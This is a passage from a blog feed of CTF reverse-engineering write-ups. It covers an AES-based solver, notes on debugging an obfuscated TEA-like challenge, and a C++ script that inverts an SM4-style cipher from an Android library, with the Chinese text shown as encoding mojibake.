class="keyword">in</span> list_com(lists[<span class="number">1</span>:]):</span><br><span class="line">            result.append([item] + rest)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">reallylast = list_com(fi)</span><br><span class="line"><span class="built_in">print</span>(reallylast)</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="string">&#x27;3577402ECCA44A3F9AB72182F9B01F35&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cipher = AES.new(key, AES.MODE_ECB)</span><br><span class="line">dec = [cipher.decrypt(<span class="built_in">bytes</span>(i)).<span class="built_in">hex</span>() <span class="keyword">for</span> i <span class="keyword">in</span> reallylast]</span><br><span class="line"><span class="built_in">print</span>(dec[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(dec[<span class="number">1</span>])</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">4d87ef03-77bb-491a-80f5-4620245807c4</span></span><br><span class="line"><span class="string">0461d177-8471-23e0-dd55-0c471123c3f1</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>æœ€åæœ‰ä¸¤ä¸ªå€¼ï¼Œä½†æ˜¯åªæœ‰ç¬¬ä¸€ä¸ªæ˜¯å¯¹çš„ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚</p><h2 id="ez-re">ez_re</h2><p>è¿™ä¸ªé¢˜ä¸€æ‰“å¼€äººå°±å‚»äº†ï¼Œå…¨æ˜¯èŠ±ï¼Œæˆ‘è¯¥æ€ä¹ˆåˆ†ææµç¨‹å‘¢</p><p>é‚£å°±ç¡¬è°ƒå§QAQ</p><p><img src="https://s2.loli.net/2024/11/01/FQd9oBjMCPXDHaL.png" alt="image-20241101153119187"></p><p>è¾“å…¥å®Œä¹‹åæ­¥å‡ºï¼Œåˆ°è¿™é‡Œï¼Œè¯´æ˜è¿™ä¹‹å‰åœ¨è¾“å…¥ä¹‹å‰</p><p>ç„¶åè½¬åˆ°dataæ®µå¼€å¤´ï¼Œæœ‰ä¸€ä¸ª56é•¿åº¦çš„æ•°æ®ï¼Œåé¢æœ‰ä¸€ä¸ª0x12345678</p><p>çŒœæµ‹é•¿åº¦æ˜¯56ï¼Œå¯¹ä¸Šé¢ä¸¤ä¸ªæ•°æ®ä¸‹æ–­ç‚¹ï¼Œç„¶årun</p><p>åœ¨æŸä¸ªåœ°æ–¹æ–­ä¸‹æ¥äº†ï¼ˆè§¦å‘äº†0x12345678çš„æ–­ç‚¹ï¼‰ï¼Œå‘ç°æŸä¸ªå¯„å­˜å™¨ä¿å­˜çš„è¾“å…¥è¢«å¼‚æˆ–äº†</p><p>è¾“å…¥</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">11111111111111111111111111111111111111111111111111</span>&#125;</span><br></pre></td></tr></table></figure><p>è¾“å‡º</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">0x19</span>, <span class="number">0</span>x13, <span class="number">0</span>x1E, <span class="number">0</span>x18, <span class="number">0</span>x04, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, </span><br><span class="line"><span class="attribute">0x4E</span>, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, </span><br><span class="line"><span class="attribute">0x4E</span>, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, </span><br><span class="line"><span class="attribute">0x4E</span>, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x4E, <span class="number">0</span>x02</span><br></pre></td></tr></table></figure><p>ç»§ç»­å¾€åè°ƒï¼Œ7FF7FBA45F18ä½ç½®å‘ç°RAXå˜æˆäº†9E3779B9ï¼Œæœ‰å¯èƒ½æ˜¯Tea</p><p>åé¢ä¼šå‘ç°å®ƒæŠŠeaxçš„å€¼æ”¾åˆ°æ ˆé‡Œé¢ï¼Œæ¥ç€å°±æ˜¯è¿™ä¸€æ¬¡çš„åŠ å¯†æ•°æ®</p><p><img src="https://s2.loli.net/2024/11/01/ZexVLnO3dpksPht.png" alt="image-20241101193839970"></p><p>çŒœæ˜¯ä¸ªteaï¼Œç„¶åä¸ä¼šäº†</p>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ··æ·† </tag>
            
            <tag> re </tag>
            
            <tag> å®‰å“ </tag>
            
            <tag> æ³¨å†Œè¡¨ </tag>
            
            <tag> AES </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç½‘é¼æ¯-é’é¾™ç»„-REå¤ç°</title>
      <link href="/posts/5dbf475c.html"/>
      <url>/posts/5dbf475c.html</url>
      
        <content type="html"><![CDATA[<p>å¦å¤–é‚£ä¸ªç­¾åˆ°å°±ä¸è¯´äº†</p><h2 id="easystd">easystd</h2><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42878956/1730194715128-2d39fc92-6bba-4c3b-a2a8-de200a10cde7.png" alt="img"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ç”¨çš„æ˜¯soå±‚çš„å‡½æ•°</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42878956/1730194757654-d1eed919-fe92-471a-9372-4699fed4c6e3.png" alt="img"></p><p>åˆ†æåŠ å¯†</p><p>æ ¸å¿ƒåŠ å¯†é€»è¾‘ï¼š</p><p><img src="https://cdn.nlark.com/yuque/0/2024/png/42878956/1730194870372-fbed92b0-ce4b-442c-9227-fac368beeec3.png" alt="img"></p><p>æ¯4å­—èŠ‚å­—èŠ‚åŠ å¯†ï¼Œé€šè¿‡å‰4ä¸ªå–å¾—ä¸‹ä¸€ä¸ª</p><p>æ¯è½®çš„ä¼ªä»£ç ç±»ä¼¼äºï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="built_in">input</span>[i+<span class="number">1</span>]^<span class="built_in">input</span>[i+<span class="number">2</span>]^<span class="built_in">input</span>[i+<span class="number">3</span>]^Abox[i]</span><br><span class="line">mid = xxxx(key)</span><br><span class="line">output = mid^<span class="built_in">input</span>[i]</span><br></pre></td></tr></table></figure><p>ARMæ±‡ç¼–çœ‹ä¸äº†ä¸€ç‚¹ï¼Œæ‰€ä»¥åªèƒ½å…¨é çŒœï¼Œæœ€åè¿˜æ˜¯åœ¨zaå¸ˆå‚…çš„ååŠ©ä¸‹å®Œæˆäº†ï¼Œå¥½è€¶ï¼</p><p>å–å¾—æœ€åçš„è¾“å‡ºç„¶åå†™è„šæœ¬é€†å‘å³å¯ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#include&lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include&lt;Windows.h&gt;</span></span><br><span class="line"><span class="comment">#include&lt;cstdlib&gt;</span></span><br><span class="line">UINT8 change_box[] = &#123; <span class="number">0xD1</span>, <span class="number">0x97</span>, <span class="number">0xEE</span>, <span class="number">0xF9</span>, <span class="number">0xCB</span>, <span class="number">0xE6</span>, <span class="number">0x3A</span>, <span class="number">0xB0</span>, <span class="number">0x11</span>, <span class="number">0xB1</span>, <span class="number">0x13</span>, <span class="number">0xC5</span>, <span class="number">0x2F</span>, <span class="number">0xFC</span>, <span class="number">0x2B</span>, <span class="number">0x02</span>, <span class="number">0x2C</span>, <span class="number">0x60</span>, <span class="number">0x9D</span>, <span class="number">0x71</span>, <span class="number">0x2D</span>, <span class="number">0xB9</span>, <span class="number">0x03</span>, <span class="number">0xC4</span>, <span class="number">0xAD</span>, <span class="number">0x43</span>, <span class="number">0x14</span>, <span class="number">0x21</span>, <span class="number">0x4E</span>, <span class="number">0x81</span>, <span class="number">0x01</span>, <span class="number">0x9E</span>, <span class="number">0x9B</span>, <span class="number">0x45</span>, <span class="number">0x57</span>, <span class="number">0xF3</span>, <span class="number">0x96</span>, <span class="number">0xE8</span>, <span class="number">0x9F</span>, <span class="number">0x7D</span>, <span class="number">0x34</span>, <span class="number">0x53</span>, <span class="number">0x0C</span>, <span class="number">0x44</span>, <span class="number">0xEA</span>, <span class="number">0xC8</span>, <span class="number">0xAB</span>, <span class="number">0x65</span>, <span class="number">0xE3</span>, <span class="number">0xB4</span>, <span class="number">0x1B</span>, <span class="number">0xAE</span>, <span class="number">0xCE</span>, <span class="number">0x0F</span>, <span class="number">0xEF</span>, <span class="number">0x92</span>, <span class="number">0x87</span>, <span class="number">0xD8</span>, <span class="number">0x93</span>, <span class="number">0xFD</span>, <span class="number">0x72</span>, <span class="number">0x88</span>, <span class="number">0x38</span>, <span class="number">0xA1</span>, <span class="number">0x40</span>, <span class="number">0x00</span>, <span class="number">0xA0</span>, <span class="number">0xFB</span>, <span class="number">0xF4</span>, <span class="number">0x74</span>, <span class="number">0x10</span>, <span class="number">0xBD</span>, <span class="number">0x84</span>, <span class="number">0x5E</span>, <span class="number">0x3B</span>, <span class="number">0x1E</span>, <span class="number">0xE1</span>, <span class="number">0x82</span>, <span class="number">0x48</span>, <span class="number">0xAF</span>, <span class="number">0x6F</span>, <span class="number">0x6C</span>, <span class="number">0x86</span>, <span class="number">0xB5</span>, <span class="number">0x76</span>, <span class="number">0x63</span>, <span class="number">0xDD</span>, <span class="number">0x8C</span>, <span class="number">0xFF</span>, <span class="number">0xEC</span>, <span class="number">0x08</span>, <span class="number">0x4C</span>, <span class="number">0x77</span>, <span class="number">0x51</span>, <span class="number">0x9A</span>, <span class="number">0x32</span>, <span class="number">0x19</span>, <span class="number">0x23</span>, <span class="number">0x09</span>, <span class="number">0x59</span>, <span class="number">0x64</span>, <span class="number">0x5F</span>, <span class="number">0xD6</span>, <span class="number">0xA5</span>, <span class="number">0x22</span>, <span class="number">0x25</span>, <span class="number">0x7B</span>, <span class="number">0x3C</span>, <span class="number">0x06</span>, <span class="number">0x26</span>, <span class="number">0x7F</span>, <span class="number">0x80</span>, <span class="number">0xD3</span>, <span class="number">0x07</span>, <span class="number">0x41</span>, <span class="number">0x50</span>, <span class="number">0x98</span>, <span class="number">0xD4</span>, <span class="number">0x20</span>, <span class="number">0x55</span>, <span class="number">0x4B</span>, <span class="number">0x31</span>, <span class="number">0x05</span>, <span class="number">0xE0</span>, <span class="number">0xA7</span>, <span class="number">0xC3</span>, <span class="number">0xCF</span>, <span class="number">0x99</span>, <span class="number">0xED</span>, <span class="number">0xB8</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x47</span>, <span class="number">0xC0</span>, <span class="number">0x3F</span>, <span class="number">0xB2</span>, <span class="number">0xA4</span>, <span class="number">0xF0</span>, <span class="number">0xF5</span>, <span class="number">0xC9</span>, <span class="number">0xFE</span>, <span class="number">0x66</span>, <span class="number">0x12</span>, <span class="number">0xA6</span>, <span class="number">0xE7</span>, <span class="number">0xA9</span>, <span class="number">0x5A</span>, <span class="number">0xA3</span>, <span class="number">0x9C</span>, <span class="number">0x33</span>, <span class="number">0x1D</span>, <span class="number">0x52</span>, <span class="number">0xAA</span>, <span class="number">0x94</span>, <span class="number">0x35</span>, <span class="number">0x37</span>, <span class="number">0xF2</span>, <span class="number">0x8B</span>, <span class="number">0xB6</span>, <span class="number">0xE4</span>, <span class="number">0x1A</span>, <span class="number">0xF1</span>, <span class="number">0xE5</span>, <span class="number">0x29</span>, <span class="number">0x85</span>, <span class="number">0x61</span>, <span class="number">0xCD</span>, <span class="number">0x67</span>, <span class="number">0xC7</span>, <span class="number">0x2E</span>, <span class="number">0x24</span>, <span class="number">0xAC</span>, <span class="number">0x0A</span>, <span class="number">0x54</span>, <span class="number">0x49</span>, <span class="number">0x68</span>, <span class="number">0xD2</span>, <span class="number">0xDC</span>, <span class="number">0x30</span>, <span class="number">0x42</span>, <span class="number">0xD9</span>, <span class="number">0xFA</span>, <span class="number">0x89</span>, <span class="number">0x28</span>, <span class="number">0x04</span>, <span class="number">0xF8</span>, <span class="number">0x6D</span>, <span class="number">0x75</span>, <span class="number">0x6A</span>, <span class="number">0x6B</span>, <span class="number">0x5C</span>, <span class="number">0x56</span>, <span class="number">0x8A</span>, <span class="number">0x1C</span>, <span class="number">0xA8</span>, <span class="number">0x95</span>, <span class="number">0xBC</span>, <span class="number">0xDA</span>, <span class="number">0xBB</span>, <span class="number">0x78</span>, <span class="number">0x16</span>, <span class="number">0xDE</span>, <span class="number">0x5B</span>, <span class="number">0x46</span>, <span class="number">0x18</span>, <span class="number">0x17</span>, <span class="number">0x5D</span>, <span class="number">0xDF</span>, <span class="number">0x0D</span>, <span class="number">0xC6</span>, <span class="number">0x36</span>, <span class="number">0x8F</span>, <span class="number">0xA2</span>, <span class="number">0xCA</span>, <span class="number">0x7C</span>, <span class="number">0xBA</span>, <span class="number">0x2A</span>, <span class="number">0x73</span>, <span class="number">0xD7</span>, <span class="number">0x15</span>, <span class="number">0xBF</span>, <span class="number">0xE2</span>, <span class="number">0xB3</span>, <span class="number">0xB7</span>, <span class="number">0x8E</span>, <span class="number">0x6E</span>, <span class="number">0x90</span>, <span class="number">0x4D</span>, <span class="number">0x0B</span>, <span class="number">0x91</span>, <span class="number">0x70</span>, <span class="number">0x79</span>, <span class="number">0x62</span>, <span class="number">0xBE</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0xC2</span>, <span class="number">0x69</span>, <span class="number">0xC1</span>, <span class="number">0x83</span>, <span class="number">0x1F</span>, <span class="number">0xF7</span>, <span class="number">0x7A</span>, <span class="number">0xEB</span>, <span class="number">0x3D</span>, <span class="number">0xDB</span>, <span class="number">0x4A</span>, <span class="number">0x27</span>, <span class="number">0x7E</span>, <span class="number">0xE9</span>, <span class="number">0x58</span>, <span class="number">0x39</span>, <span class="number">0xD0</span>, <span class="number">0xCC</span>, <span class="number">0x3E</span>, <span class="number">0x4F</span> &#125;;</span><br><span class="line">UINT32 xor_box[] = &#123; <span class="number">0x80A3B97F</span>, <span class="number">0xB9D4ECD6</span>, <span class="number">0x7425ECAA</span>, <span class="number">0x339BD365</span>, <span class="number">0xA5D18B13</span>, <span class="number">0x56A7A4DE</span>, <span class="number">0xE907C73E</span>, <span class="number">0xD0AA04A9</span>, <span class="number">0x6C827F28</span>, <span class="number">0xE997196A</span>, <span class="number">0x0C2F2AD8</span>, <span class="number">0xFD9D6DA5</span>, <span class="number">0x164DDA6D</span>, <span class="number">0x5FDCC2A4</span>, <span class="number">0x489987B7</span>, <span class="number">0xFDEF5978</span>, <span class="number">0x96C21ACA</span>, <span class="number">0x7FF46259</span>, <span class="number">0xB9ADC94E</span>, <span class="number">0x47FB566D</span>, <span class="number">0x8CCFC943</span>, <span class="number">0x8DA5E336</span>, <span class="number">0x1B49D41B</span>, <span class="number">0x6647A175</span>, <span class="number">0xC3DE9068</span>, <span class="number">0xF6708794</span>, <span class="number">0xE94AB191</span>, <span class="number">0x540B89A4</span>, <span class="number">0xB6ABA320</span>, <span class="number">0x2A7764D0</span>, <span class="number">0xEDC490A7</span>, <span class="number">0xC1F6DA35</span> &#125;;</span><br><span class="line">unsigned <span class="built_in">int</span> last[<span class="number">12</span>] = &#123;</span><br><span class="line"><span class="number">0x2DF2B839</span>, <span class="number">0x4CA553D7</span>, <span class="number">0x72FC8455</span>, <span class="number">0xBFEC6CFF</span>, <span class="number">0x597F4EE6</span>, <span class="number">0x9EC140C6</span>, <span class="number">0xB1E70DEA</span>, <span class="number">0xBFDC0DAB</span>,</span><br><span class="line"><span class="number">0xD05154AF</span>, <span class="number">0x25A2F8C6</span>, <span class="number">0x36A4EE33</span>, <span class="number">0xD116C3F1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">unsigned <span class="built_in">int</span> lastb[<span class="number">12</span>] = &#123; <span class="number">0x39B8F22D</span>,<span class="number">0xD753A54C</span>,<span class="number">0x5584FC72</span>,<span class="number">0xFF6CECBF</span>,<span class="number">0xE64E7F59</span>,<span class="number">0xC640C19E</span>,<span class="number">0xEA0DE7B1</span>,<span class="number">0xAB0DDCBF</span>,<span class="number">0xAF5451D0</span>,<span class="number">0xC6F8A225</span>,<span class="number">0x33EEA436</span>,<span class="number">0xF1C316D1</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">#define PAIR64(high, low) (((uint64_t)(high) &lt;&lt; 32) | (uint32_t)(low))</span></span><br><span class="line">UINT64 get(<span class="built_in">int</span> index) &#123;</span><br><span class="line"><span class="keyword">return</span> change_box[index &amp; <span class="number">0xff</span>] ^ <span class="number">7</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void enc(UINT32* <span class="built_in">input</span>) &#123;</span><br><span class="line">UINT32 changer, p2, p4, p3, p1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">p1 = <span class="built_in">input</span>[i];</span><br><span class="line">p2 = <span class="built_in">input</span>[i + <span class="number">1</span>];</span><br><span class="line">p3 = <span class="built_in">input</span>[i + <span class="number">2</span>];</span><br><span class="line">p4 = <span class="built_in">input</span>[i + <span class="number">3</span>];</span><br><span class="line">UINT32 m = p2 ^ p3 ^ p4 ^ xor_box[i];</span><br><span class="line">UINT32* pm = &amp;m;</span><br><span class="line">UINT8* p = (UINT8*)pm;</span><br><span class="line">UINT32 need1 = get(p[<span class="number">3</span>]);</span><br><span class="line">UINT32 need2 = (need1 &lt;&lt; <span class="number">24</span>) | (get(p[<span class="number">2</span>]) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">UINT32 cul_num1 = (get(p[<span class="number">3</span>]) &lt;&lt; <span class="number">24</span>) | (get(p[<span class="number">2</span>]) &lt;&lt; <span class="number">16</span>) | (get(p[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) | get(p[<span class="number">0</span>]);</span><br><span class="line">UINT64 cul_num2 = ((get(p[<span class="number">0</span>]) &lt;&lt; <span class="number">24</span>) | (get(p[<span class="number">3</span>]) &lt;&lt; <span class="number">16</span>) | (get(p[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) | get(p[<span class="number">1</span>])) &lt;&lt; <span class="number">8</span>;</span><br><span class="line">UINT32 final_enc = cul_num1 ^ (cul_num2 &gt;&gt; <span class="number">8</span>) ^ p1 ^ ((need1 &gt;&gt; <span class="number">6</span>) | cul_num1 &lt;&lt; <span class="number">2</span>) ^ (PAIR64(cul_num1, need2) &gt;&gt; <span class="number">22</span>) ^ (PAIR64(cul_num1, cul_num2) &gt;&gt; <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line">//std::cout &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; std::<span class="built_in">hex</span> &lt;&lt; final_enc &lt;&lt; <span class="string">&quot; ,&quot;</span>;</span><br><span class="line"><span class="built_in">input</span>[i + <span class="number">4</span>] = final_enc;</span><br><span class="line">&#125;</span><br><span class="line">std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void dec(UINT* <span class="built_in">input</span>) &#123;</span><br><span class="line">UINT32 changer, p2, p4, p3, p1;</span><br><span class="line">UINT32 out[<span class="number">5</span>] = &#123;&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">35</span>; i &gt; <span class="number">3</span>; i--) &#123;</span><br><span class="line">p1 = <span class="built_in">input</span>[i - <span class="number">3</span>];</span><br><span class="line">p2 = <span class="built_in">input</span>[i - <span class="number">2</span>];</span><br><span class="line">p3 = <span class="built_in">input</span>[i - <span class="number">1</span>];</span><br><span class="line">p4 = <span class="built_in">input</span>[i];</span><br><span class="line"></span><br><span class="line">UINT32 m = p1 ^ p2 ^ p3 ^ xor_box[i - <span class="number">4</span>];</span><br><span class="line">UINT32* pm = &amp;m;</span><br><span class="line">UINT8* p = (UINT8*)pm;</span><br><span class="line">UINT32 need1 = get(p[<span class="number">3</span>]);</span><br><span class="line">UINT32 need2 = (need1 &lt;&lt; <span class="number">24</span>) | (get(p[<span class="number">2</span>]) &lt;&lt; <span class="number">16</span>);</span><br><span class="line">UINT32 cul_num1 = (get(p[<span class="number">3</span>]) &lt;&lt; <span class="number">24</span>) | (get(p[<span class="number">2</span>]) &lt;&lt; <span class="number">16</span>) | (get(p[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) | get(p[<span class="number">0</span>]);</span><br><span class="line">UINT64 cul_num2 = ((get(p[<span class="number">0</span>]) &lt;&lt; <span class="number">24</span>) | (get(p[<span class="number">3</span>]) &lt;&lt; <span class="number">16</span>) | (get(p[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) | get(p[<span class="number">1</span>])) &lt;&lt; <span class="number">8</span>;</span><br><span class="line">UINT32 final_dec = cul_num1 ^ (cul_num2 &gt;&gt; <span class="number">8</span>) ^ p4 ^ ((need1 &gt;&gt; <span class="number">6</span>) | cul_num1 &lt;&lt; <span class="number">2</span>) ^ (PAIR64(cul_num1, need2) &gt;&gt; <span class="number">22</span>) ^ (PAIR64(cul_num1, cul_num2) &gt;&gt; <span class="number">14</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (i &lt; <span class="number">8</span>) &#123;</span><br><span class="line">out[i - <span class="number">4</span>] = final_dec;</span><br><span class="line"><span class="built_in">input</span>[i - <span class="number">4</span>] = final_dec;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">input</span>[i - <span class="number">4</span>] = final_dec;</span><br><span class="line">&#125;</span><br><span class="line">//std::cout &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; std::<span class="built_in">hex</span> &lt;&lt; final_dec &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//std::cout &lt;&lt; std::endl;</span><br><span class="line">//std::cout &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; std::<span class="built_in">hex</span> &lt;&lt; out[<span class="number">0</span>] &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; std::<span class="built_in">hex</span> &lt;&lt; out[<span class="number">1</span>] &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; std::<span class="built_in">hex</span> &lt;&lt; out[<span class="number">2</span>] &lt;&lt; <span class="string">&quot;0x&quot;</span> &lt;&lt; std::<span class="built_in">hex</span> &lt;&lt; out[<span class="number">3</span>];</span><br><span class="line">std::cout &lt;&lt; (char*)out &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main(void) &#123;</span><br><span class="line">//UINT32 input_num[<span class="number">36</span>] = &#123; <span class="number">0x31323334</span>, <span class="number">0x31323334</span>, <span class="number">0x35363738</span>, <span class="number">0x35363738</span> &#125;;</span><br><span class="line">//UINT32 encn[<span class="number">36</span>] = &#123;&#125;;</span><br><span class="line">//<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">//&#123;</span><br><span class="line">//encn[i] = input_num[i];</span><br><span class="line">//&#125;</span><br><span class="line">//enc(encn);</span><br><span class="line">//UINT32 lll[<span class="number">32</span>] = &#123; <span class="number">0xee53ae6d</span> ,<span class="number">0xad8d58d3</span> ,<span class="number">0xe904c44a</span> ,<span class="number">0xffa30914</span> ,<span class="number">0xa34d50fe</span> ,<span class="number">0x6d0b76d8</span> ,<span class="number">0x93d7b44c</span> ,<span class="number">0x9f34dba</span> ,<span class="number">0x43f64ea2</span> ,<span class="number">0xd2961d0a</span> ,<span class="number">0xabc12a71</span> ,<span class="number">0x5506c498</span> ,<span class="number">0xe60804c1</span> ,<span class="number">0x6fab9817</span> ,<span class="number">0xa680fb2e</span> ,<span class="number">0xc903775d</span> ,<span class="number">0xacae3b34</span> ,<span class="number">0x564cb9a3</span> ,<span class="number">0x93db754a</span> ,<span class="number">0x66321125</span> ,<span class="number">0xbc6fcb43</span> ,<span class="number">0x5a069224</span> ,<span class="number">0x3661a351</span> ,<span class="number">0xa06815fb</span> ,<span class="number">0xa7096626</span> ,<span class="number">0xc78b501</span> ,<span class="number">0xf9d14107</span> ,<span class="number">0x1ecbf7c7</span> ,<span class="number">0xd23229c8</span> ,<span class="number">0xf04e9414</span> ,<span class="number">0x4eee3557</span> ,<span class="number">0xd01d30b3</span> &#125;;</span><br><span class="line">//<span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++)</span><br><span class="line">//&#123;</span><br><span class="line">//encn[i] = <span class="number">0</span>;</span><br><span class="line">//&#125;</span><br><span class="line">//dec(encn);</span><br><span class="line"><span class="keyword">for</span> (<span class="built_in">int</span> i = <span class="number">0</span>; i &lt; <span class="number">12</span>; i += <span class="number">4</span>)</span><br><span class="line">&#123;</span><br><span class="line">UINT32 tround[<span class="number">36</span>] = &#123;&#125;;</span><br><span class="line">tround[<span class="number">32</span>] = lastb[i + <span class="number">3</span>];</span><br><span class="line">tround[<span class="number">33</span>] = lastb[i + <span class="number">2</span>];</span><br><span class="line">tround[<span class="number">34</span>] = lastb[i + <span class="number">1</span>];</span><br><span class="line">tround[<span class="number">35</span>] = lastb[i];</span><br><span class="line">dec(tround);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„æœ€åè¾“å‡ºé¡ºåºæ˜¯å€’åºè¾“å‡ºï¼Œå½“æ—¶è¢«è¿™ä¸ªå‘äº†</p><hr><p>æœ€åçœ‹å®Œå…¶å®ƒäººçš„wpå‘ç°è¿™ä¸ªå°±æ˜¯ä¸ªSM4ï¼Œæˆ‘ç™½å­¦äº†QAQ</p>]]></content>
      
      
      <categories>
          
          <category> é¢˜é›† </category>
          
          <category> CTF </category>
          
          <category> æ¯”èµ› </category>
          
      </categories>
      
      
